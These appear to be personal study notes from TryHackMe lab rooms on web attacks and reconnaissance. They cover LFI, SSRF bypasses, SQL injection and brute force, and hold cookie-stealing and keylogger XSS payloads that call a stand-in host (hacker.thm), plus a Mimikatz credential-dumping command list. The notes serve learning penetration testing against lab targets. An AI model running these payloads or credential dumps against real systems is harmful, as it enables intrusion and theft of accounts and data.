Another useful search is following intitle:index.of followed by a search keyword. This can give a list of files on the servers. For example, intitle:index.of mp3 will give all the MP3 files available on various types of servers. 

#OSINT - Wayback Machine
The Wayback Machine (https://archive.org/web/) is a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website.

#S3 Buckets
S3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn't be available to the public. The format of the S3 buckets is http(s)://{name}.s3.amazonaws.com where {name} is decided by the owner, such as tryhackme-assets.s3.amazonaws.com. S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as {name}-assets, {name}-www, {name}-public, {name}-private, etc.

#Automated
dirb http://10.10.125.127/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.TXT
gobuster dir --url http://10.10.125.127/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

-=-=-=-=-
Subdomain enumeration
#SSL/TLS certificates
When an SSL/TLS (Secure Sockets Layer/Transport Layer Security) certificate is created for a domain by a CA (Certificate Authority), CA's take part in what's called "Certificate Transparency (CT) logs". These are publicly accessible logs of every SSL/TLS certificate created for a domain name. The purpose of Certificate Transparency logs is to stop malicious and accidentally made certificates from being used
  https://crt.sh/ 

#DNS Bruteforce 
dnsrecon -t brt -d acmeitsupport.thm

#Virtual hosts 
Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the Host header. We can utilise this host header by making changes to it and monitoring the response to see if we've discovered a new website.
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host:FUZZ.acmeitsupport.thm" -u http://10.10.80.215 -fs 2395


#Authentication Bypass 
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.70.209/customers/signup -mr "username already exists"

#Brute force 
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.70.209/customers/login -fc 200

#Logic flaws
In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable $_REQUEST.


The PHP $_REQUEST variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.
curl 'http://10.10.70.209/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
curl 'http://10.10.70.209/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'

-=-=-=-=-=-
Cookie tampering
#Plain text
curl -H "Cookie: logged_in=true; admin=true" http://10.10.70.209/cookie-test
#Hashing
#encoding
Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point in encoding? Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.

Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.


Take the below data as an example which is set by the web server upon logging in:

Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
This string base64 decoded has the value of {"id":1,"admin": false} we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access.

-=-=-=-=-=-=-=
IDOR
giving you access to data that you shouldn't have.

-=--=-=-=-
File inclusion
#Path traversal
/etc/passwd or C:\boot.ini C:\windows\win.ini

Common OS files to test
Location	Description

/etc/issue	contains a message or system identification to be printed before the login prompt.

/etc/profile	controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived
/proc/version	specifies the version of the Linux kernel

/etc/passwd	has all registered user that has access to a system

/etc/shadow	contains information about the system's users' passwords

/root/.bash_history	contains the history commands for root user

/var/log/dmessage	contains global system messages, including the messages that are logged during system startup

/var/mail/root	all emails for root user
/root/.ssh/id_rsa	Private SSH keys for a root or any known valid user on the server
/var/log/apache2/access.log	the accessed requests for Apache  webserver
C:\boot.ini	contains the boot options for computers with BIOS firmware

=============
#LFI
Examples wih PHP
1. It works because there isn't a directory specified in the include function and no input validation.
http://webapp.thm/get.php?file=/etc/passwd
<?PHP 
	include($_GET["lang"]);
?>

2. If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.
<?PHP 
	include("languages/". $_GET['lang']); 
?>

3. Using null bytes
Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.
The %00 trick is fixed and not working with PHP 5.3.4 and above.

4.In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The /etc/passwd file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte %00 or the current directory trick at the end of the filtered keyword /.. The exploit will be similar to http://webapp.thm/index.php?lang=/etc/passwd/. We could also use http://webapp.thm/index.php?lang=/etc/passwd%00

5. The developer starts to use input validation by filtering some keywords. The web application replaces the ../ with the empty string. There are a couple of techniques we can use to bypass this.

First, we can send the following payload to bypass it: ....//....//....//....//....//etc/passwd

Why did this work?

This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass,

6. The developer forces the include to read from a defined directory! For example, if the web application asks to supply input that has to include a directory such as: http://webapp.thm/index.php?lang=languages/EN.php then, to exploit this, we need to include the directory in the payload like so: ?lang=languages/../../../../../etc/passwd

========
#RFI
An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.

host vcs.fsf.org
    HostkeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa

ssh -oHostKeyAlgorithms=+ssh-dss -i id_rsa root@<ip>
  OpenSSH since 7.0 doesn't accept hostkey ssh-dss and you must add it, similarly since 8.8 it doesn't use client ssh-rsa and you must add that with -oPubkeyAcceptedAlgorithms=+ssh-rsa.

-=-=-=-=-
SSRF
1. Modify URL
  Hacker request
    http://website.thm/stock?url=http://api.website.thm/api/user 
2. Path traversal 
    http://website.thm/stock?url=/../user
3. Server subdomain to wich the request is made
    http://website.thme/stock?server=api.website.thm/api/user&x=&id=123
    the payload ending in &x= is being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a paramter (?x=) on the query string

4. Change a value like in an avatar election with a payload like x/../private being private a directory interesting

#Defeating common SSRF 
Deny list
Attackers can bypass a Deny List by using alternative localhost references such as 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io.

Also, in a cloud environment, it would be beneficial to block access to the IP address 169.254.169.254, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254


Allow List
An allow list is where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL used in a parameter must begin with https://website.thm. An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm. The application logic would now allow this input and let an attacker control the internal HTTP request.


Open Redirect

If the above bypasses do not work, there is one more trick up the attacker's sleeve, the open redirect. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address. Take, for example, the link https://website.thm/link?url=https://tryhackme.com. This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes. But imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.thm/. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.

-=-=-=-=-=-=-=
XSS 
PoC
  <script>alert('XSS');</script>
  <marquee>testing</marquee>
Stealing cookie
  <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
    The </textarea> tag closes the textarea field. 
    The <script>tag opens open an area for us to write JavaScript.
    The fetch() command makes an HTTP request.
    {URL_OR_IP} is either the THM request catcher URL or your IP address from the THM AttackBox or your IP address on the THM VPN Network.
    ?cookie= is the query string that will contain the victim's cookies.
    btoa() command base64 encodes the victim's cookies.
    document.cookie accesses the victim's cookies for the Acme IT Support Website.
    </script>closes the JavaScript code block.
Keylogger
  <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:
  <script>user.changeEmail('attacker@hacker.thm');</script>

-----
Stored XSS
the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

Example Scenario:
  A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.

-----
Blind XSS
Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

Example Scenario:

A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.

Potential Impact:

Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.
xsshunter is a popular tool

-----
Reflected XSS
Example scenario
  A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source.

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation. The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.
  https://website.thm/?error=<script src="https://attacker.thm/evil.js"></script>


-----
Exploiting the DOM

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.

Example Scenario:
  The website's JavaScript gets the contents from the window.location.hash parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.

When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval().


-----
Testing 
You can see your name reflected inside the value attribute of the input tag. "><script>alert('THM');</script>
With "> we close the value attribute

Other
  You'll have to escape the existing JavaScript command, so you're able to run your code; you can do this with the following payload ';alert('THM');//  which you'll see from the below screenshot will execute your code. The ' closes the field specifying the name, then ; signifies the end of the current command, and the // at the end makes anything after it a comment rather than executable code

<sscriptcript>alert('THM');</sscriptcript>
/images/cat.jpg" onload="alert('THM');

Polyglots:


An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e



-=-=-=-=-=-=-=-=
Command injection
The shell operators ;, |, & and && will combine two (or more) system commands and execute them both
sleep[in Linux]=timeout[in Windows]
https://github.com/payloadbox/command-injection-payload-list

--=-=-=-=-=
=-=-=-=-=-=
-=-=-=-=-=-=-=-=-=

SQL
A database is controlled by a DBMS which is an acronym for  Database Management System, DBMS's fall into two camps Relational or Non-Relational, the focus of this room will be on Relational databases,  some common one's you'll come across are MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite

Non-relational databases sometimes called NoSQL on the other hand is any sort of database that doesn't use tables, columns and rows to store the data, a specific database layout doesn't need to be constructed so each row of data can contain different information which can give more flexibility over a relational database.  Some popular databases of this type are MongoDB, Cassandra and ElasticSearch

It's worth noting that SQL syntax is not case sensitive.

Inside mysql (with credentials). An example
mysql -u wordpress -p 
show databases;
use phpmyadmin;
show tables;
describe usernames_table;

Example:
  select * from users;
    The semicolon at the end tells the database that this is the end of the query.  

  select * from users LIMIT 1;
    This query, like the first, returns all the columns by using the * selector and then the "LIMIT 1" clause forces the database only to return one row of data. Changing the query to "LIMIT 1,1" forces the query to skip the first result, and then "LIMIT 2,1" skips the first two results, and so on. You need to remember the first number tells the database how many results you wish to skip, and the second number tells the database how many rows to return.

  select * from users where username='admin';

  select * from users where username like 'a%';
    This returns any rows with username beginning with the letter a.

  select * from users where username like '%n';
    This returns any rows with username ending with the letter n.

  select * from users where username like '%mi%';
    This returns any rows with a username containing the characters mi within them.

  SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
    The UNION statement combines the results of two or more SELECT statements to retrieve data from either single or multiple tables; the rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type and the column order has to be the same. 

  insert into users (username,password) values ('bob','password123');
    The INSERT statement tells the database we wish to insert a new row of data into the table. "into users" tells the database which table we wish to insert the data into, "(username,password)" provides the columns we are providing data for and then "values ('bob','password');" provides the data for the previously specified columns

  update users SET username='root',password='pass123' where username='admin';
    The UPDATE statement tells the database we wish to update one or more rows of data within a table. You specify the table you wish to update using "update %tablename% SET" and then select the field or fields you wish to update as a comma-separated list such as "username='root',password='pass123'" then finally similar to the SELECT statement, you can specify exactly which rows to update using the where clause such as "where username='admin;".

  delete from users where username='martin';
    The DELETE statement tells the database we wish to delete one or more rows of data. Apart from missing the columns you wish to be returned, the format of this query is very similar to the SELECT. You can specify precisely which data to delete using the where clause and the number of rows to be deleted using the LIMIT clause.

  SELECT * from blog where id=1 and private=0 LIMIT 1;
    the SQL statement above is looking in the blog table for an article with the id number of 1 and the private column set to 0, which means it's able to be viewed by the public and limits the results to only one match


-=-=-=-=-=-
SQLi
   Let's pretend article id 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:
  https://website.thm/blog?id=2;--

  Which would then, in turn, produce the SQL statement:
  SELECT * from blog where id=2;-- and private=0 LIMIT 1;
  The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment. By doing this, you're just, in fact, running the query:

  SELECT * from blog where id=2;--
  Which will return the article with an id of 2 whether it is set to public or notes

-----
In-Band SQL Injection
In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.


Error-Based SQL Injection
This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 


Union-Based SQL Injection
  This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

  The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " ).

  Try typing an apostrophe ( ' ) after the id=1 and press enter. And you'll see this returns an SQL error informing you of an error in your syntax. The fact that you've received this error message confirms the existence of an SQL Injection vulnerability. We can now exploit this vulnerability and use the error messages to learn more about the database structure. 

  The first thing we need to do is return data to the browser without displaying an error message. Firstly we'll try the UNION operator so we can receive an extra result of our choosing. Try setting the mock browsers id parameter to:
  1 UNION SELECT 1

  This statement should produce an error message informing you that the UNION SELECT statement has a different number of columns than the original SELECT query. So let's try again but add another column:
  1 UNION SELECT 1,2

  Same error again, so let's repeat by adding another column:
  1 UNION SELECT 1,2,3

  Success, the error message has gone, and the article is being displayed, but now we want to display our data instead of the article. The article is being displayed because it takes the first returned result somewhere in the web site's code and shows that. To get around that, we need the first query to produce no results. This can simply be done by changing the article id from 1 to 0.
  0 UNION SELECT 1,2,3

  You'll now see the article is just made up of the result from the UNION select returning the column values 1, 2, and 3. We can start using these returned values to retrieve more useful information. First, we'll get the database name that we have access to:
  0 UNION SELECT 1,2,database()
  You'll now see where the number 3 was previously displayed; it now shows the name of the database, which is sqli_one.

  Our next query will gather a list of tables that are in this database.
  0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

  There are a couple of new things to learn in this query. Firstly, the method group_concat() gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users. 


  As the first level aims to discover Martin's password, the staff_users table is what is of interest to us. We can utilise the information_schema database again to find the structure of this table using the below query.
  0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

  This is similar to the previous SQL query. However, the information we want to retrieve has changed from table_name to column_name, the table we are querying in the information_schema database has changed from tables to columns, and we're searching for any rows where the table_name column has a value of staff_users.

  The query results provide three columns for the staff_users table: id, password, and username. We can use the username and password columns for our following query to retrieve the user's information.
  0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users


  Again we use the group_concat method to return all of the rows into one string and to make it easier to read. We've also added ,':', to split the username and password from each other. Instead of being separated by a comma, we've chosen the HTML <br> tag that forces each result to be on a separate line to make for easier reading.


###Blind SQLi - Authentication Bypass

Authentication Bypass
One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms. In this instance, we aren't that interested in retrieving data from the database; We just want to get past the login. 

Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more whether the two make a matching pair in the users table. In basic terms, the web application is asking the database "do you have a user with the username bob and the password bob123?", and the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not. 
Taking the above information into account, it's unnecessary to enumerate a valid username/password pair. We just need to create a database query that replies with a yes/true.

  We could use ' or 1=1;--

###Blind SQLi - Boolean based
admin123' UNION SELECT 1,2,3 where database() like '%';--

We get a true response because, in the like operator, we just have the value of %, which will match anything as it's the wildcard value. If we change the wildcard operator to a%, you'll see the response goes back to false, which confirms that the database name does not begin with the letter a. We can cycle through all the letters, numbers and characters such as - and _ until we discover a match. If you send the below as the username value, you'll receive a true response that confirms the database name begins with the letter s.

admin123' UNION SELECT 1,2,3 where database() like 's%';--

###Blind SQLi - Time based
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--


-=-=-=-=-=-=
Burpsuite room
#Decoder


URL: It involves exchanging characters for their ASCII character code in hexadecimal format, preceded by a percentage symbol (%). Url encoding is an extremely useful method to know for any kind of web application testing.
For example, let's encode the forward-slash character (/). The ASCII character code for a forward slash is 47. This is "2F" in hexadecimal, making the URL encoded forward-slash %2F.

HTML: Encoding text as HTML Entities involves replacing special characters with an ampersand (&) followed by either a hexadecimal number or a reference to the character being escaped, then a semicolon (;). For example, a quotation mark has its own reference: &quot;. When this is inserted into a webpage, it will be replaced by a double quotation mark ("). This encoding method allows special characters in the HTML language to be rendered safely in HTML pages and has the added bonus of being used to prevent attacks such as XSS (Cross-Site Scripting).

Base64: Another widely used encoding method, base64 is used to encode any data in an ASCII-compatible format. It was designed to take binary data (e.g. images, media, programs) and encode it in a format that would be suitable to transfer over virtually any medium

ASCII Hex: This option converts data between ASCII representation and hexadecimal representation. For example, the word "ASCII" can be converted into the hexadecimal number "4153434949". Each letter in the original data is taken individually and converted from numeric ASCII representation into hexadecimal. For example, the letter "A" in ASCII has a decimal character code of 65. In hexadecimal, this is 41. Similarly, the letter "S" can be converted to hexadecimal 53, and so on.
-=-=-=-=
Mimikatz 
Here are just some of the most popular Mimikatz command and related functionality.

    CRYPTO::Certificates – list/export certificates
    KERBEROS::Golden – create golden/silver/trust tickets
    KERBEROS::List – List all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user’s tickets.Similar to functionality of “klist”.
    KERBEROS::PTT – pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust).
    LSADUMP::DCSync – ask a DC to synchronize an object (get password data for account). No need to run code on DC.
    LSADUMP::LSA – Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such as krbtgt with the parameter /name: “/name:krbtgt”
    LSADUMP::SAM – get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer.
    LSADUMP::Trust – Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest).
    MISC::AddSid – Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016.
    MISC::MemSSP – Inject a malicious Windows SSP to log locally authenticated credentials.
    MISC::Skeleton – Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a “master password” (aka Skeleton Keys) as well as their usual password.
    PRIVILEGE::Debug – get debug rights (this or Local System rights is required for many Mimikatz commands).
    SEKURLSA::Ekeys – list Kerberos encryption keys
    SEKURLSA::Kerberos – List Kerberos credentials for all authenticated users (including services and computer account)
    SEKURLSA::Krbtgt – get Domain Kerberos service account (KRBTGT)password data
    SEKURLSA::LogonPasswords – lists all available provider credentials. This usually shows recently logged on user and computer credentials.
    SEKURLSA::Pth – Pass- theHash and Over-Pass-the-Hash
    SEKURLSA::Tickets – Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer’s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).
    TOKEN::List – list all tokens of the system
    TOKEN::Elevate – impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box
    TOKEN::Elevate /domainadmin – impersonate a token with Domain Admin credentials.


-=-=-=-=-=-=-=-=-=-=
-=-=-=-=-=-=-=-=-=-=
Passive Recon 
We use whois to query WHOIS records, while we use nslookup and dig to query DNS database records. These are all publicly available records and hence do not alert the target.

We will also learn the usage of two online services:

    DNSDumpster
    Shodan.io
    virustotal

-=-=-=
whois 
 A WHOIS server listens on TCP port 43 for incoming requests. The domain registrar is responsible for maintaining the WHOIS records for the domain names it is leasing.

-=-=-=
nslookup 
Query type 	Result
A 	IPv4 Addresses
AAAA 	IPv6 Addresses
CNAME 	Canonical Name
MX 	Mail Servers
SOA 	Start of Authority
TXT 	TXT Records

Purpose 	Commandline Example
Lookup WHOIS record 	whois tryhackme.com
Lookup DNS A records 	nslookup -type=A tryhackme.com
Lookup DNS MX records at DNS server 	nslookup -type=MX tryhackme.com 1.1.1.1
Lookup DNS TXT records 	nslookup -type=TXT tryhackme.com
Lookup DNS A records 	dig tryhackme.com A
Lookup DNS MX records at DNS server 	dig @1.1.1.1 tryhackme.com MX
Lookup DNS TXT records 	dig tryhackme.com TXT

-=-=-=-=-=-=-=-=-=-=
Active Recon
ping

On Linux, traceroute will start by sending UDP datagrams within IP packets of TTL being 1. Thus, it causes the first router to encounter a TTL=0 and send an ICMP Time-to-Live exceeded back. Hence, a TTL of 1 will reveal the IP address of the first router to you. Then it will send another packet with TTL=2; this packet will be dropped at the second router. And so on.

*The number of hops/routers between your system and the target system depends on the time you are running traceroute. There is no guarantee that your packets will always follow the same route, even if you are on the same network or you repeat the traceroute command within a short time.
*Some routers return a public IP address. You might examine a few of these routers based on the scope of the intended penetration testing.
*Some routers don’t return a reply

telnet
telnet 10.10.29.184 80 
  GET / HTTP/1.1 
  host: example

-=-=-=-=-=-=-=
nmap01

We present the different approaches that Nmap uses to discover live hosts. In particular, we cover:

    ARP scan: This scan uses ARP requests to discover live hosts
    ICMP scan: This scan uses ICMP requests to identify live hosts
    TCP/UDP ping scan: This scan sends packets to TCP ports and UDP ports to determine live hosts.

We also introduce two scanners, arp-scan and masscan, and explain how they overlap with part of Nmap’s host discovery.

Starting from bottom to top, we can use:

    ARP from Link Layer
    ICMP from Network Layer
    TCP from Transport Layer
    UDP from Transport Layer

ICMP has many types. ICMP ping uses Type 8 (Echo) and Type 0 (Echo Reply).
-=-=-=-=-=-=-=-=-=-=-=-=
Host Discovery using ARP 
If you want to ping a system on the same subnet, an ARP query should precede the ICMP Echo.

Although TCP and UDP are transport layers, for network scanning purposes, a scanner can send a specially-crafted packet to common TCP or UDP ports to check whether the target will respond. This method is efficient, especially when ICMP Echo is blocked.


There are various ways to discover online hosts. When no host discovery options are provided, Nmap follows the following approaches to discover live hosts:

    When a privileged user tries to scan targets on a local network (Ethernet), Nmap uses ARP requests. A privileged user is root or a user who belongs to sudoers and can run sudo.
    When a privileged user tries to scan targets outside the local network, Nmap uses ICMP echo requests, TCP ACK (Acknowledge) to port 80, TCP SYN (Synchronize) to port 443, and ICMP timestamp request.
    When an unprivileged user tries to scan targets outside the local network, Nmap resorts to a TCP 3-way handshake by sending SYN packets to ports 80 and 443.

Nmap, by default, uses a ping scan to find live hosts, then proceeds to scan live hosts only. If you want to use Nmap to discover online hosts without port-scanning the live systems, you can issue nmap -sn TARGETS. Let’s dig deeper to gain a solid understanding of the different techniques used.

ARP scan is possible only if you are on the same subnet as the target systems. On an Ethernet (802.3) and WiFi (802.11), you need to know the MAC address of any system before you can communicate with it. The MAC address is necessary for the link-layer header; the header contains the source MAC address and the destination MAC address among other fields. To get the MAC address, the OS sends an ARP query. A host that replies to ARP queries is up. The ARP query only works if the target is on the same subnet as yourself, i.e., on the same Ethernet/WiFi. You should expect to see many ARP queries generated during a Nmap scan of a local network. If you want Nmap only to perform an ARP scan without port-scanning, you can use nmap -PR -sn TARGETS, where -PR indicates that you only want an ARP scan. The following example shows Nmap using ARP for host discovery without any port scanning. We run nmap -PR -sn MACHINE_IP/24 to discover all the live systems on the same subnet as our target machine.

nmap -PR -sn 10.10.223.163/24

arp-scan --localnet OR arp-scan -l 
arp-scan -I eth0 -l
-=-=-=-=-=--=-=-=-=-=
Host Discovery using ICMP
To use ICMP echo request to discover live hosts, add the option -PE. (Remember to add -sn if you don’t want to follow that with a port scan.) As shown in the following figure, an ICMP echo scan works by sending an ICMP echo request and expects the target to reply with an ICMP echo reply if it is online.

#ICMP Echo
nmap -PE -sn 10.10.223.163/24
###The scan output shows that eight hosts are up; moreover, it shows their MAC addresses. Generally speaking, we don’t expect to learn the MAC addresses of the targets unless they are on the same subnet as our system. The output above indicates that Nmap didn’t need to send ICMP packets as it confirmed that these hosts are up based on the ARP responses it received.###

Because ICMP echo requests tend to be blocked, you might also consider ICMP Timestamp or ICMP Address Mask requests to tell if a system is online. Nmap uses timestamp request (ICMP Type 13) and checks whether it will get a Timestamp reply (ICMP Type 14). Adding the -PP option tells Nmap to use ICMP timestamp requests.

#ICMP Timestamp
nmap -PP -sn 10.10.223.163/24

Similarly, Nmap uses address mask queries (ICMP Type 17) and checks whether it gets an address mask reply (ICMP Type 18). This scan can be enabled with the option -PM.
#ICMP Address Mask
nmap -PM -sn 10.10.223.163/24
-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=
Host Discovery using TCP and UDP
If you want Nmap to use TCP SYN ping, you can do so via the option -PS followed by the port number, range, list, or a combination of them. For example, -PS21 will target port 21, while -PS21-25 will target ports 21, 22, 23, 24, and 25. Finally -PS80,443,8080 will target the three ports 80, 443, and 8080.

Privileged users (root and sudoers) can send TCP SYN packets and don’t need to complete the TCP 3-way handshake even if the port is open, as shown in the figure below. Unprivileged users have no choice but to complete the 3-way handshake if the port is open.

#TCP SYN ping
nmap -PS -sn MACHINE_IP/24 
#Technically speaking, since we didn’t specify any TCP ports to use in the TCP ping scan, Nmap used common ports; in this case, it is TCP port 80. Any service listening on port 80 is expected to reply, indirectly indicating that the host is online.


TCP ACK Ping

As you have guessed, this sends a packet with an ACK flag set. You must be running Nmap as a privileged user to be able to accomplish this. If you try it as an unprivileged user, Nmap will attempt a 3-way handshake.

By default, port 80 is used. The syntax is similar to TCP SYN ping. -PA should be followed by a port number, range, list, or a combination of them. For example, consider -PA21, -PA21-25 and -PA80,443,8080. If no port is specified, port 80 will be used.

The following figure shows that any TCP packet with an ACK flag should get a TCP packet back with an RST flag set. The target responds with the RST flag set because the TCP packet with the ACK flag is not part of any ongoing connection. The expected response is used to detect if the target host is up.

In this example, we run sudo nmap -PA -sn MACHINE_IP/24 to discover the online hosts on the target’s subnet

-=-=-=-=
UDP Ping

Finally, we can use UDP to discover if the host is online. Contrary to TCP SYN ping, sending a UDP packet to an open port is not expected to lead to any reply. However, if we send a UDP packet to a closed UDP port, we expect to get an ICMP port unreachable packet; this indicates that the target system is up and available.

In the following figure, we see a UDP packet sent to an open UDP port and not triggering any response. However, sending a UDP packet to any closed UDP port can trigger a response indirectly indicating that the target is online.

The syntax to specify the ports is similar to that of TCP SYN ping and TCP ACK ping; Nmap uses -PU for UDP ping.

-=-=-==-
Masscan
However, to finish its network scan quickly, Masscan is quite aggressive with the rate of packets it generates. The syntax is quite similar: -p can be followed by a port number, list, or range. Consider the following examples:

    masscan MACHINE_IP/24 -p443
    masscan MACHINE_IP/24 -p80,443
    masscan MACHINE_IP/24 -p22-25
    masscan MACHINE_IP/24 ‐‐top-ports 100

-=-==-=-=-=-=-=-=-
Using reverse-dns lookup 
